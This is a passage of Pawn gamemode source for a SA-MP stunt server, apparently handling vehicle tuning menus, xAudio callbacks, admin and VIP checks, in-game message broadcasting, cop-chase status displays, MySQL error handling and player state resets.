 	vID = GetPlayerVehicleID(playerid);
  	/*if (!TunableVehicles( vID ))
	{
 		ShowMenuForPlayer(TuningMenu,playerid);
		SendClientMessage(playerid, COLOR_IVORY, "This vehicle doesn't support custom wheels");
		return 1;
	}*/

  	switch(row) {
  	case 0: {
  	        AddVehicleComponent( vID , 1080);
  	        ShowMenuForPlayer(W2Menu,playerid);
			}
   	case 1: {
   	        AddVehicleComponent( vID , 1081);
   	        ShowMenuForPlayer(W2Menu,playerid);
			}
   	case 2: {
   	        AddVehicleComponent( vID , 1082);
   	        ShowMenuForPlayer(W2Menu,playerid);
			}
  	case 3: {
			AddVehicleComponent( vID , 1083);
			ShowMenuForPlayer(W2Menu,playerid);
			}
   	case 4: {
            AddVehicleComponent( vID , 1084);
            ShowMenuForPlayer(W2Menu,playerid);
			}
  	case 5: {
            AddVehicleComponent( vID , 1085);
            ShowMenuForPlayer(W2Menu,playerid);
			}
   	case 6: {
            AddVehicleComponent( vID , 1096);
            ShowMenuForPlayer(W2Menu,playerid);
			}
  	case 7: {
            AddVehicleComponent( vID , 1097);
            ShowMenuForPlayer(W2Menu,playerid);
			}
   	case 8: {
            AddVehicleComponent( vID , 1098);
            ShowMenuForPlayer(W2Menu,playerid);
            }
   	case 9: {
  			/*SetPlayerPos(playerid, 0, 0, 1);
  			PutPlayerInVehicle(playerid, vID, 0);*/
  			SetCameraBehindPlayer(playerid);
			ShowMenuForPlayer(TuningMenu,playerid);
			player[playerid][tunecam] = 0;
			}
		}
	}
	else if (Current == PMenu) {

 	vID = GetPlayerVehicleID(playerid);
  	/*if (!PaintjobVehicles( vID ))
  	{
 		ShowMenuForPlayer(TuningMenu,playerid);
		SendClientMessage(playerid, COLOR_IVORY, "This vehicle doesn't support paintjobs");
		return 1;
	}*/

  	switch(row) {
  	case 0: {
  	        ChangeVehiclePaintjob( vID ,0);
  	        ShowMenuForPlayer(PMenu,playerid);
			}
   	case 1: {
   	        ChangeVehiclePaintjob( vID ,1);
   	        ShowMenuForPlayer(PMenu,playerid);
			}
   	case 2: {
   	        ChangeVehiclePaintjob( vID ,2);
   	        ShowMenuForPlayer(PMenu,playerid);
			}
   	case 3: {
 			/*SetPlayerPos(playerid, 0, 0, 1);
  			PutPlayerInVehicle(playerid, vID, 0);*/
  			SetCameraBehindPlayer(playerid);
			ShowMenuForPlayer(TuningMenu,playerid);
			player[playerid][tunecam] = 0;
			}
		}
	}
	return 1;
}

public OnPlayerExitedMenu(playerid)
{
    //printf("\r\n[DEBUG-STUNTA] OnPlayerExitedMenu(%d)", playerid);

	if (player[playerid][tunecam] == 1)
	{
		/*SetPlayerPos(playerid, 0, 0, 1);
  		PutPlayerInVehicle(playerid, GetPlayerVehicleID(playerid), 0);*/
  		SetCameraBehindPlayer(playerid);
		HideMenuForPlayer(TuningMenu,playerid);
		player[playerid][tunecam] = 0;
	}
    TogglePlayerControllable(playerid, 1);
	return 1;
}

public Audio_OnClientConnect(playerid)
{
	SendServerMessage(playerid, EMBED_NAVYBLUE, "You are now {009933}connected"EMBED_NAVYBLUE" to xAudio.");
	//GameTextForPlayer(playerid, "~n~~n~~n~~n~~n~~n~~n~~n~~n~~n~~n~~w~xAudio: ~g~Connected.", 6000, 3);

	/*GetPlayerName(playerid, playername, sizeof(playername));
	format(stringe, sizeof(stringe), "15,1xAudio: %s has connected.", playername);
	IRC_GroupSay(1, IRC_CHANNEL, stringe);*/

	Audio_TransferPack(playerid);
	return 1;
}

public Audio_OnClientDisconnect(playerid)
{
	SendServerMessage(playerid, EMBED_NAVYBLUE, "You are now {FF4775}disconnected"EMBED_NAVYBLUE" to xAudio.");
	//GameTextForPlayer(playerid, "~n~~n~~n~~n~~n~~n~~n~~n~~n~~n~~n~~w~xAudio: ~r~Disconnected.", 6000, 3);

	/*GetPlayerName(playerid, playername, sizeof(playername));
	format(stringe, sizeof(stringe), "15,1xAudio: %s has disconnected.", playername);
	IRC_GroupSay(1, IRC_CHANNEL, stringe);*/
	return 1;
}

public Audio_OnPlay(playerid, handleid)
{
	return 1;
}

public Audio_OnStop(playerid, handleid)
{
	if (handleid == player[playerid][HANDLEID_GLOBAL]) player[playerid][HANDLEID_GLOBAL] = -1;
	return 1;
}

public Audio_OnTransferFile(playerid, file[], current, total, result)
{
	//new string[128];
	/*switch(result)
	{
		case 0: format(string, sizeof(string), "~n~~n~~n~~n~~n~~n~~n~~n~~n~~n~~b~Audio file \"%s\"~n~(%d of %d) finished local download", file, current, total);
		case 1: format(string, sizeof(string), "~n~~n~~n~~n~~n~~n~~n~~n~~n~~n~~b~Audio file \"%s\"~n~(%d of %d) finished remote download", file, current, total);
		case 2: format(string, sizeof(string), "~n~~n~~n~~n~~n~~n~~n~~n~~n~~n~~b~Audio archive \"%s\"~n~(%d of %d) finished extraction", file, current, total);
		case 3: format(string, sizeof(string), "~n~~n~~n~~n~~n~~n~~n~~n~~n~~n~~b~Audio file/archive \"%s\"~n~(%d of %d) passed check", file, current, total);
		case 4: format(string, sizeof(string), "~n~~n~~n~~n~~n~~n~~n~~n~~n~~r~Audio file/archive \"%s\"~n~(%d of %d) could not be~n~downloaded or extracted", file, current, total);
	}*/
	//SendClientMessage(playerid, COLOR_YELLOW, string);
	//GameTextForPlayer(playerid, string, 6000, 3);
	if (current == total)
	{
		Audio_Play(playerid, 1);
		//SendClientMessage(playerid, COLOR_YELLOW, "All files have been processed");
		//GameTextForPlayer(playerid, "~n~~n~~n~~n~~n~~n~~n~~n~~n~~n~~n~~g~All files have been processed", 6000, 3);
	}
	return 1;
}

public Audio_OnTrackChange(playerid, handleid, track[])
{
	/*format(stringe, sizeof(stringe), "xAudio: Now playing \"%s\" (%d)", track, handleid);
	SendClientMessage(playerid, COLOR_YELLOW, stringe);*/

	format(stringe, sizeof(stringe), "~n~~n~~n~~n~~n~~n~~n~~n~~n~~y~Now Playing:~n~~w~ %s", track);
	GameTextForPlayer(playerid, stringe, 8000, 3);
	return 1;
}

public Audio_OnRadioStationChange(playerid, station) // in-game radio station
{
	/*new string[128];
	format(string, sizeof(string), "Radio station set to %d (%s) (Player ID: %d)", station, stationNames[station], playerid);
	SendClientMessage(playerid, 0xFFFF00FF, string);*/
	return 1;
}

public Audio_OnGetPosition(playerid, handleid, seconds)
{
	/*new string[128];
	format(string, sizeof(string), "Audio position currently at %d seconds (Handle ID: %d) (Player ID: %d)", seconds, handleid, playerid);
	SendClientMessage(playerid, 0xFFFF00FF, string);*/
	return 1;
}

public CreateExplosionEx(Float:X, Float:Y, Float:Z, type, Float:Radius)
return CreateExplosion(X, Y, Z, type, Radius);

public SetPlayerPosEx(playerid, Float:X, Float:Y, Float:Z, Float:Angle, Interior)
{
	if (!IsPlayerConnected(playerid)) return 1;
    //printf("\r\n[DEBUG-STUNTA] SetPlayerPosEx(%d, %f, %f, %f, %f, %d)", playerid, X, Y, Z, Angle, Interior);

    Streamer_UpdateEx(playerid, X, Y, Z, GetPlayerVirtualWorld(playerid), Interior);
    SetPlayerInterior(playerid, Interior);
	if (IsPlayerDriver(playerid))
	{
		new vID = GetPlayerVehicleID(playerid);

		SetVehiclePos(vID, X, Y, Z);
		SetVehicleZAngle(vID, Angle);
		LinkVehicleToInterior(vID, Interior);
		/*SetPlayerPos(playerid, X, Y, Z+1);
		PutPlayerInVehicle(playerid, vID, 0);*/
	} else {
		SetPlayerPos(playerid, X, Y, Z);
		SetPlayerFacingAngle(playerid, Angle);
	}
	SetCameraBehindPlayer(playerid);
	return 1;
}

public OnPlayerClickMap(playerid, Float:fX, Float:fY, Float:fZ)
{
	if (!IsPlayerInDMSPJA(playerid) && !IsPlayerBlocked(playerid) && gotos == true)
    SetPlayerPosFindZ(playerid, fX, fY, fZ);
    return 1;
}

/*public EnableSpray()
return payandsprayinuse = false;*/

public IsVIP(playerid)
{
	if (IsPlayerAdmin(playerid))
	{
		player[playerid][VIP] = 1;
		player[playerid][ADMIN] = 5;
		return 1;
	}

	return player[playerid][VIP];
}

public IsAdmin(playerid)
{
   	if (IsPlayerAdmin(playerid))
   	{
		player[playerid][VIP] = 1;
		player[playerid][ADMIN] = 5;
		return 1;
	}

	if (player[playerid][ADMIN] != 0) return 1;
	else return 0;
}

IsPlayerAdminLevel(playerid, plevel)
{
	if (player[playerid][ADMIN] >= plevel) return 1;
   	else return 0;
}

public GetPlayerAdminLevel(playerid)
return player[playerid][ADMIN];

public IsPlayerRegistered(playerid)
{
	if (player[playerid][accountid] != 0) return 1;
	else return 0;
}

public IsPlayerLoggedIn(playerid)
return player[playerid][logged];

public GetPlayerCinc(playerid)
return player[playerid][cinc];

public ObjectsLoading(playerid)
{
	TogglePlayerControllable(playerid, 0);
	GameTextForPlayer(playerid, "~r~Objects loading", 2000, 6);
	SetTimerEx("ObjectsLoaded", 2000, 0, "i",playerid);
	return 1;
}

public ObjectsLoaded(playerid)
{
	TogglePlayerControllable(playerid, 1);
	GameTextForPlayer(playerid, "~b~Objects loaded", 2000, 6);
	return 1;
}

public Lightning(playerid)
{
	if (!IsPlayerConnected(playerid)) return 1;

    player[playerid][godmode] = 0;
	GetPlayerPos(playerid, playerxyza[0], playerxyza[1], playerxyza[2]);
	CreateExplosion(playerxyza[0], playerxyza[1], playerxyza[2], 11, 0.0);
	SetPlayerArmour(playerid, 0.0);
	SetPlayerHealth(playerid, 0.0);
	GetPlayerName(playerid, playername, sizeof(playername));
	format(logstring, sizeof(logstring), "%s was struck by a lightning!",playername);
	SendServerMessageToAll(EMBED_LIGHTBLUE , logstring);
	printflog("STRIKE", logstring);
	return 1;
}

public DeleteObject(objectid)
{
	//printf("\r\n[DEBUG-STUNTA] DeleteObject(%d)", objectid);
	return DestroyDynamicObject(objectid);
}

public DeletePlayerObject(playerid, objectid)
{
	//printf("\r\n[DEBUG-STUNTA] DeletePlayerObject(%d, %d)", playerid, objectid);
	return DestroyPlayerObject(playerid, objectid);
}

public GetPlayerAccountID(playerid)
return player[playerid][accountid];

public IsPlayerSpawned(playerid)
return player[playerid][spawned];

public IsPlayerMuted(playerid)
return player[playerid][muted];

public IsPlayerBlocked(playerid)
return player[playerid][blocked];

public IsPlayerInDMSPJA(playerid)
{
	if (player[playerid][playingdm] == 1 || player[playerid][playingderby] == 1 || player[playerid][playingrr] == 1 || player[playerid][playingcc] == 1 || player[playerid][playingnb] == 1 || player[playerid][playingwarzone] == 1 || player[playerid][specdm] == 1 || player[playerid][Spectating] == 1 || player[playerid][jailed] == 1 || player[playerid][afk] > 0) return 1;
	else return 0;
}

stock IsPlayerInCrew(playerid, crewid)
{
	if (player[playerid][moviecrew] == crewid)
	return 1;
	return 0;
}

stock IsPlayerInAnyCrew(playerid)
{
	if (player[playerid][moviecrew] >= 0)
	return 1;
	return 0;
}

stock GetPlayerCrewID(playerid)
return player[playerid][moviecrew];

public CountDown()
{
	if (Count > 0)
	{
		GameTextForAll( CountText[Count-1], 2500, 3);
		Count--;
		SetTimer("CountDown", 1000, 0);
	} else {
		GameTextForAll("~r~!GO GO GO!", 2500, 3);
		Count = 5;
	}
	return 1;
}

public CrewCountDown(crewid)
{
	if (!IsValidCrewID(crewid))
	return 1;

	if (CrewCount > 0)
	{
		for (new i = 0; i < MAX_PLAYERS; i++)
		{
	  		if (IsPlayerConnected(i) && player[i][moviecrew] == crewid)
	  		{
	  		    if (CrewCount == 5) GameTextForPlayer(i, CrewCountText[CrewCount-1], 2000, 3);
				//if (CrewCount < 4 && CrewCount >= 0)
				else {
				    if (CrewCount == 3)
					{
				 		format(strings, sizeof(strings), "~n~~n~~n~~n~~n~~n~~n~~n~~n~~w~SCENE %d   ~r~]   ~y~TAKE %d", crewscene[crewid], crewshot[crewid]);
				 		GameTextForPlayer(i, strings, 3000, 3);
					}

					SendClientMessage(i, PlayerColors[random(sizeof(PlayerColors))],CrewCountText[CrewCount-1]);
				}
			}
		}
		CrewCount--;
		SetTimerEx("CrewCountDown", 1000, 0, "i", crewid);
	} else {
		for (new i = 0; i < MAX_PLAYERS; i++)
		{
	  		if (IsPlayerConnected(i) && player[i][moviecrew] == crewid)
  	  		SendClientMessage(i, PlayerColors[random(sizeof(PlayerColors))], "!!! ACTION !!!");
		}
		CrewCount = 5;
	}
	return 1;
}

stock IsValidCrewID(crewid)
{
	if (!crews[crewid]) return 0;
	else return 1;
}

stock SendMessageToCrew(crewid, str[])
{
	for (new a = 0; a < MAX_PLAYERS; a++)
	{
	    if (IsPlayerConnected(a) && player[a][moviecrew] == crewid)
    	SendClientMessage(a, COLOR_ORANGE, str);
	}
}

stock SendMessageToRR(str[], time)
{
	for (new rp = 0; rp < MAX_PLAYERS; rp++)
	{
		if (IsPlayerConnected(rp) && player[rp][playingrr] == 1)
		GameTextForPlayer(rp, str, time, 3);
	}
}

stock SendMessageToCC(str[], time)
{
	for (new cp = 0; cp < MAX_PLAYERS; cp++)
	{
		if (IsPlayerConnected(cp) && player[cp][playingcc] == 1)
		GameTextForPlayer(cp, str, time, 3);
	}
}

stock SendMessageToNB(str[], time)
{
	for (new cp = 0; cp < MAX_PLAYERS; cp++)
	{
		if (IsPlayerConnected(cp) && player[cp][playingnb] == 1)
		GameTextForPlayer(cp, str, time, 3);
	}
}

stock SendMessageToWarzone(str[], time)
{
	for (new cp = 0; cp < MAX_PLAYERS; cp++)
	{
		if (IsPlayerConnected(cp) && player[cp][playingwarzone] == 1)
		GameTextForPlayer(cp, str, time, 3);
	}
}

stock SendServerMessage(playerid, embed_colour_msg[], message[]) // Inform player about change
{
	new msgStr[140];
	format(msgStr, sizeof(msgStr), "[S]: %s%s", embed_colour_msg, message);
	SendClientMessage(playerid, COLOR_NAVYBLUE, msgStr);
	return 1;
}

stock SendErrorMessage(playerid, embed_colour_msg[], message[]) // Inform player about change
{
	new msgStr[140];
	format(msgStr, sizeof(msgStr), "[ERROR]: %s%s", embed_colour_msg, message);
	SendClientMessage(playerid, COLOR_RED, msgStr);
	return 1;
}

stock SendForcedServerMessageToAll(embed_colour_msg[], message[]) // Inform player about change
{
	new msgStr[140];
	format(msgStr, sizeof(msgStr), "[S]: %s%s", embed_colour_msg, message);
	SendClientMessageToAll(COLOR_NAVYBLUE, msgStr);
	return 1;
}

forward SendServerMessageToAll(embed_colour_msg[], message[]);
public SendServerMessageToAll(embed_colour_msg[], message[]) // Inform player about change
{
	new msgStr[140];
	format(msgStr, sizeof(msgStr), "[S]: %s%s", embed_colour_msg, message);
	//SendClientMessageToAll(COLOR_NAVYBLUE, msgStr); // see SendForcedServerMessageToAll
	for (new pID = 0; pID < MAX_PLAYERS; pID++)
	{
	    if (IsPlayerConnected(pID) && player[pID][chat] == 0)
		SendClientMessage(pID, COLOR_NAVYBLUE, msgStr);
	}
	return 1;
}

stock SendServerMessageToAdmins(embed_colour_msg[], message[], adminlevel) // Inform specific admins
{
	new msgStr[160];
	format(msgStr, sizeof(msgStr), "[A-%d]: %s%s", adminlevel, embed_colour_msg, message);
	for (new a = 0; a < MAX_PLAYERS; a++)
	{
	    if (IsPlayerConnected(a) && player[a][ADMIN] >= adminlevel && player[a][adminmsgs] == 1)
		SendClientMessage(a, COLOR_RED, msgStr);
	}
	printflog("ADM-MSG", msgStr);
	return 1;
}

stock SendCommandMessageToAdmins(playerid, vacmd[], adminlevel = 3)
{
	new cmdStr[75];
	
	GetPlayerName(playerid, playername, sizeof(playername));
	if (IsAdmin(playerid)) format(cmdStr, sizeof(cmdStr), "[A-%d]: "EMBED_IVORY"%s has used /%s", adminlevel, playername, vacmd);
	else format(cmdStr, sizeof(cmdStr), "[V-%d]: "EMBED_IVORY"%s has used /%s", adminlevel, playername, vacmd);
	
	for (new a = 0; a < MAX_PLAYERS; a++)
	{
	    if (IsPlayerConnected(a) && player[a][ADMIN] >= adminlevel && player[a][adminmsgs] == 1)
		SendClientMessage(a, COLOR_RED, cmdStr);
	}
	printflog("VA-CMD", cmdStr);
	return 1;
}

stock UpdateCCStatus()
{
	new personallist[131],
		playerlist1[220],
	    statuslist1[189],
	    playerlist2[220],
	    statuslist2[189],
		cpname[24],
		spname[24],
		timeleft[7],
		location[25] = "Unknown",
		textdrawslot = 0;

	personallist = "Officer";
	playerlist1 = "Player:~n~";
	statuslist1 = "Status:~n~";
	playerlist2 = "Player:~n~";
	statuslist2 = "Status:~n~";

	format(timeleft, sizeof(timeleft), "%d min", (ccsecondslefttillend / 60)+1);
    GetPlayerName(currentcccriminal, spname, sizeof(spname));

	for (new ccP = 0; ccP < MAX_COPCHASE_PLAYERS; ccP++)
	{
		if (ccplayerlist[ccP] == -1)
		continue;

	    if (player[ ccplayerlist[ccP] ][playingcc] == 1)
	    {
		    GetPlayerName(ccplayerlist[ccP], cpname, sizeof(cpname));
		    if (currentcccriminal != ccplayerlist[ccP])
		    {
				textdrawslot++;
	 			if (player[ ccplayerlist[ccP] ][playerccmode] == 0)
	 			{
					format(personallist, sizeof(personallist), "~b~Officer %s~n~~y~Time remaining: %s~n~Suspect: %s~n~~w~Minimap: NOT VISIBLE", cpname, timeleft, spname);
					if (textdrawslot < 8)
					{
						format(playerlist1, sizeof(playerlist1), "%s~n~~w~%s", playerlist1, cpname);
						strcat(statuslist1, "~n~Standby");
					} else {
						format(playerlist2, sizeof(playerlist2), "%s~n~~w~%s", playerlist2, cpname);
						strcat(statuslist2, "~n~Standby");
					}
				} else if (player[ ccplayerlist[ccP] ][playerccmode] == 1)
				{
					format(personallist, sizeof(personallist), "~b~Officer %s~n~~y~Time remaining: %s~n~Suspect: %s~n~~r~Minimap: VISIBLE", cpname, timeleft, spname);
					if (textdrawslot < 8)
					{
						format(playerlist1, sizeof(playerlist1), "%s~n~~r~%s", playerlist1, cpname);
						strcat(statuslist1, "~n~Assistance required");
					} else {
						format(playerlist2, sizeof(playerlist2), "%s~n~~r~%s", playerlist2, cpname);
						strcat(statuslist2, "~n~Assistance required");
					}
				} else {
					format(personallist, sizeof(personallist), "~b~Officer %s~n~~y~Time remaining: %s~n~Suspect: %s~n~~b~Minimap: VISIBLE", cpname, timeleft, spname);
					GetPlayer2DZone(ccplayerlist[ccP], location, sizeof(location));
					if (textdrawslot < 8)
					{
						format(playerlist1, sizeof(playerlist1), "%s~n~~b~%s", playerlist1, cpname);
						format(statuslist1, sizeof(statuslist1), "%s~n~%s", statuslist1, location);
					} else {
						format(playerlist2, sizeof(playerlist2), "%s~n~~b~%s", playerlist2, cpname);
						format(statuslist2, sizeof(statuslist2), "%s~n~%s", statuslist2, location);
					}
					location = "Unknown";
				}
 			} else {
				format(personallist, sizeof(personallist), "~n~~n~~y~%s~n~Time remaining: %s", cpname, timeleft);
 			}
			TextDrawSetString(ccstatus[ ccplayerlist[ccP] ], personallist);
		}
	}
	TextDrawSetString(ccstatus2, playerlist1);
	TextDrawSetString(ccstatus3, statuslist1);
	if (textdrawslot < 8)
	{
	    playerlist2 = "_";
	    statuslist2 = "_";
	}
	TextDrawSetString(ccstatus4, playerlist2);
	TextDrawSetString(ccstatus5, statuslist2);
	return 1;
}

public SendMessageToVIPs(color, str[])
{
	for (new a = 0; a < MAX_PLAYERS; a++)
	{
	    if (IsPlayerConnected(a) && IsVIP(a))
    	SendClientMessage(a, color, str);
	}
}

public SendMessageToAdmins(color, str[], admlevel)
{
	for (new a = 0; a < MAX_PLAYERS; a++)
	{
	    if (IsPlayerConnected(a) && player[a][ADMIN] >= admlevel)
		SendClientMessage(a, color, str);
	}
	printflog("ADM-MSG", str);
}

public OnQueryError(errorid, error[], callback[], query[], connectionHandle)
{
	/*new errorStr[325],
  		File:file,
		ye, mo, da,
		ho, mi, se;

	getdate(ye, mo, da);
	gettime(ho, mi, se);

	if (!fexist("mysql_log.txt"))
	{
		file = fopen("mysql_log.txt", io_write);
		if (file)
		{
			format(errorStr, sizeof(errorStr), "\r\n[%d-%02d-%02d] [%02d:%02d:%02d] Error (%d): %s; resultid: %d", ye, mo, da, ho, mi, se, errorid, error, 0);
			fwrite(file, errorStr);
			format(errorStr, sizeof(errorStr), "\r\n[%d-%02d-%02d] [%02d:%02d:%02d] Query: %s; resultid: %d", ye, mo, da, ho, mi, se, query, 0);
			fwrite(file, errorStr);
			fclose(file);
		}
	} else {
		file = fopen("mysql_log.txt", io_append);
		if (file)
		{
			format(errorStr, sizeof(errorStr), "\r\n[%d-%02d-%02d] [%02d:%02d:%02d] Error (%d): %s; resultid: %d", ye, mo, da, ho, mi, se, errorid, error, 0);
			fwrite(file, errorStr);
			format(errorStr, sizeof(errorStr), "\r\n[%d-%02d-%02d] [%02d:%02d:%02d] Query: %s; resultid: %d", ye, mo, da, ho, mi, se, query, 0);
			fwrite(file, errorStr);
			fclose(file);
		}
	}
	//print(errorStr);
	format(errorStr, sizeof(errorStr), "OnQueryError (%d): %s; resultid: %d", errorid, error, 0);
	IRC_GroupSay(1, IRCHOP_CHANNEL, errorStr);*/

	switch(errorid)
	{
		/*case CR_COMMAND_OUT_OF_SYNC:
		{
			printf("Commands out of sync for thread ID: %d", resultid);
			printflog("MYSQL", "Commands out of sync. (Code #2)");
		}
		case ER_SYNTAX_ERROR:
		{
			printf("Something is wrong in your syntax, query: %s", query);
			printflog("MYSQL", "Something is wrong in your syntax. (Code #2)");
		}*/
		case 1040, 1041, 1154, 1203, 1226: // 2003
		{
		    if (mysqloffline == true)
		    return 1;

	    	mysql_close(mysqlConnection);
	        mysqloffline = true;
     		printflog("MYSQL-E", "Could not connect to MySQL database! Starting offline (GM). (Code #2)");
  			//printf("%s, query: %s", error, query);
		}
	}
	return 1;
}

ResetPlayerArrays(playerid)
{
	player[playerid][playtime] 			= 0;
	player[playerid][VIP] 				= 0;
 	player[playerid][ADMIN] 			= 0;
	player[playerid][logged] 			= 0;
	player[playerid][accountid] 		= 0;
 	player[playerid][clogged] 			= 0;
 	player[playerid][hideadmin] 		= 0;
 	player[playerid][adminmsgs] 		= 0;
 	player[playerid][firstspawn] 		= 1;
 	player[playerid][pspawnid] 			= -1;
    player[playerid][spawned] 			= 0;
    player[playerid][logintimeout] 		= -1;
    player[playerid][loginfail] 		= 0;
	player[playerid][godmode] 			= 0;
	player[playerid][vgodmode] 			= 0;
	player[playerid][vlights] 			= 0;
	player[playerid][vlightmode] 		= 0;
	player[playerid][warnings] 			= 0;
	player[playerid][lastwarned] 		= -1;
 	player[playerid][ramps] 			= 0;
 	player[playerid][antifall] 			= 0;
 	player[playerid][antifallvid] 		= 0;
	player[playerid][antifallsid] 		= 0;
	player[playerid][pcolour] 			= 0;
	player[playerid][Spectating] 		= 0;
	player[playerid][SpectatingOn] 		= -1;
	player[playerid][SpectatingInfo] 	= -1;
	player[playerid][InShamal] 			= -1;
	player[playerid][InAndromada] 		= -1;
    player[playerid][suicide] 			= 0;
	player[playerid][playingdm] 		= 0;
 	player[playerid][playingderby] 		= 0;
 	player[playerid][playingrr] 		= 0;
 	player[playerid][playingcc] 		= 0;
	player[playerid][playerccmode] 		= 0;
 	player[playerid][playingnb] 		= 0;
 	player[playerid][playernbteam] 		= 0;
 	player[playerid][playernbmode]      = 0;
 	player[playerid][playingwarzone]	= 0;
 	player[playerid][playerwarzoneteam]	= 0;
 	player[playerid][playerwarzonemode]	= 0;
 	player[playerid][playerwarzoneset]	= 0;
 	player[playerid][eventinvite]		= 0;
	player[playerid][specdm] 			= 0;
 	player[playerid][running]			= 0;
 	player[playerid][runningon]			= 0;
 	player[playerid][walking]			= 0;
 	player[playerid][walkingon]			= 0;
    player[playerid][skating] 			= 0;
    player[playerid][swimming] 			= 0;
	player[playerid][tunecam] 			= 0;
	player[playerid][frozen] 			= 0;
	player[playerid][jailed] 			= 0;
    player[playerid][muted] 			= 0;
	player[playerid][blocked] 			= 0;
	player[playerid][strew] 			= 0;
	player[playerid][strewid] 			= -1;
	player[playerid][apc]				= 0;
	player[playerid][acc] 				= 0;
	player[playerid][vehiclecolor1] 	= -1;
	player[playerid][savedvehicle]		= -1;
	player[playerid][vehiclebind]		= 0;
	player[playerid][savedms]			= 1.0;
	player[playerid][gotomode] 			= 1;
	player[playerid][interior] 			= 0;
	player[playerid][virtualworld] 		= 0;
	player[playerid][ostickc] 			= 0;
	player[playerid][postickc] 			= 0;
	player[playerid][chat]		 		= 0;
	player[playerid][moviecrew] 		= -1;
	player[playerid][crewinvite] 		= -1;
	player[playerid][delay] 			= 0;
	player[playerid][spamprotection] 	= 0;
	player[playerid][spamcount] 		= 0;
	player[playerid][spamcounttokick] 	= 0;
	player[playerid][afk] 				= 0;
	player[playerid][INTROtextdraw] 	= 0;
	player[playerid][FadeTimer] 		= -1;
	player[playerid][FadeStep] 			= 0;
	player[playerid][FadeStepOn] 		= 0;
	player[playerid][RULEStextdraw] 	= 0;
	player[playerid][DONATEtextdraw] 	= 0;
	player[playerid][FPStextdraw]		= 0;
	player[playerid][DrunkLevelLast]	= 0;
	player[playerid][FPS]				= 0;
	player[playerid][PMSGtextdraw]		= -1;
	player[playerid][voted]				= -1;
	player[playerid][clickedplayer]		= -1;
	player[playerid][disablepm]			= 0;
	player[playerid][lastpm]			= -1;
	player[playerid][showicons]			= 0;
	player[playerid][socreated]			= 0;
	player[playerid][aftimer]			= -1;
	player[playerid][strewdist]			= 0.0;
	player[playerid][AFKtickcount]		= 0;
	player[playerid][radio]				= 1;
	player[playerid][HANDLEID_GLOBAL]	= -1;
	player[playerid][HANDLEID_RADIO]	= -1;

	for (new s = 0; s < MAX_SPAWNS; s++)
	{
		playerxyzaiv[playerid][s][0] = -1;
		playerxyzaiv[playerid][s][1] = -1;
		playerxyzaiv[playerid][s][2] = -1;
		playerxyzaiv[playerid][s][3] = -1;
	}

	for (new i = 0; i < VIP_MAX_OSTICKS; i++)
	{
	    pSObject[playerid][i][so_object] 		= -1;
	    pSObject[playerid][i][so_model] 		= -1;
	    pSObject[playerid][i][so_isvehicle]		= 0;
	    pSObject[playerid][i][so_vehiclemodel]	= 0;
		pSObject[playerid][i][so_x]     		= 0.0;
		pSObject[playerid][i][so_y]     		= 0.0;
		pSObject[playerid][i][so_z]     		= 0.0;
		pSObject[playerid][i][so_rx]    		= 0.0;
		pSObject[playerid][i][so_ry]    		= 0.0;
		pSObject[playerid][i][so_rz]    		= 0.0;
	}

	for (new pi = 0; pi < VIP_MAX_POSTICKS; pi++)
	{
		pAObject[playerid][pi][ao_model]	= -1;
		pAObject[playerid][pi][ao_bone]		= 0;
		pAObject[playerid][pi][ao_x]		= 0.0;
		pAObject[playerid][pi][ao_y]		= 0.0;
		pAObject[playerid][pi][ao_z]		= 0.0;
		pAObject[playerid][pi][ao_rx]		= 0.0;
		pAObject[playerid][pi][ao_ry]		= 0.0;
		pAObject[playerid][pi][ao_rz]		= 0.0;
		pAObject[playerid][pi][ao_sx]		= 1.0;
		pAObject[playerid][pi][ao_sy]		= 1.0;
		pAObject[playerid][pi][ao_sz]		= 1.0;
	}
	return 1;
}

public SpawnPlayerEx1(playerid)
return SpawnPlayer(playerid);

public SpawnPlayerEx2(playerid)
{
	player[playerid][playingdm] = 0;
	SpawnPlayer(playerid);
	return 1;
}

public DestroyVehicleEx(vehicleid)
{
	if (GetVehicleModel(vehicleid)) DestroyVehicle(vehicleid);
	return 1;
}

stock GetXYInFrontOfPlayer(playerid, &Float:x, &Float:y, Float:distance)
{	// Created by Y_Less

	new Float:a;

	GetPlayerFacingAngle(playerid, a);

	if (IsPlayerInAnyVehicle(playerid))
 	GetVehicleZAngle( GetPlayerVehicleID(playerid), a);

	x += (distance * floatsin(-a, degrees));
	y += (distance * floatcos(-a, degrees));
}

stock GetXYBehindPlayer(playerid, &Float:x, &Float:y, Float:distance)
{	// Created by Y_Less

	new Float:a;

	GetPlayerFacingAngle(playerid, a);

	if (IsPlayerInAnyVehicle(playerid))
 	GetVehicleZAngle( GetPlayerVehicleID(playerid), a);

	x -= (distance * floatsin(-a, degrees));
	y -= (distance * floatcos(-a, degrees));
}

stock RemovePlayerFromVehicleEx(playerid)
{
	//ClearAnimations(playerid);
	player[playerid][antifall] = 0;
    new Float:rX,
		Float:rY,
		Float:rZ;

	GetPlayerPos(playerid, rX, rY, rZ);
	SetPlayerPos(playerid, rX, rY, rZ);
	return 1;
}

stock GetVehicleModelIDFromName(vname[])
{
	for (new i = 0; i < 211; i++)
	{
		if (strfind(aVehicleNames[i], vname, true) != -1)
		return i + 400;
	}
	return -1;
}

stock IsPlayerInWater(playerid)
{
    new index = GetPlayerAnimationIndex(playerid);
    return ((index >=  1538 && index <= 1541) || index == 1544);
}

/*stock IsPlayerInArea(playerid, Float:min_x, Float:min_y, Float:max_x, Float:max_y)
{
	new Float:X,
       	Float:Y,
       	Float:Z;

 	GetPlayerPos(playerid, X, Y, Z);
 	if (X <= max_x && X >= min_x && Y <= max_y && Y >= min_y) return 1;
 	else return 0;
}*/

stock AddDerbyPlayer(playerid)
{
	SetPlayerSpecialAction(playerid, SPECIAL_ACTION_NONE);
	player[playerid][playingderby] = 1;
	derbyplayers++;

	GetPlayerName(playerid, playername, sizeof(playername));
	format(derbystr, sizeof(derbystr), "D%d/Comment", DerbyID);
	if (derbyplayers == 1)
	{
		format(strings, sizeof(strings), "%s has started derby \"%s\" [/derby - Max.Players: %d Vehicle: %s]", playername, dj(DERBYFILE, derbystr), DerbyMaxPlayers, aVehicleNames[DerbyVehicleID - 400]);
		SendServerMessageToAll(EMBED_FLBLUE, strings);
		format(strings, sizeof(strings), "2 %s has started derby \"%s\" [/derby - Max.Players: %d Vehicle: %s]", playername, dj(DERBYFILE, derbystr), DerbyMaxPlayers, aVehicleNames[DerbyVehicleID - 400]);
		IRC_GroupSay(1, IRC_CHANNEL, strings);
		derbysecondsleft = 40;
	} else {
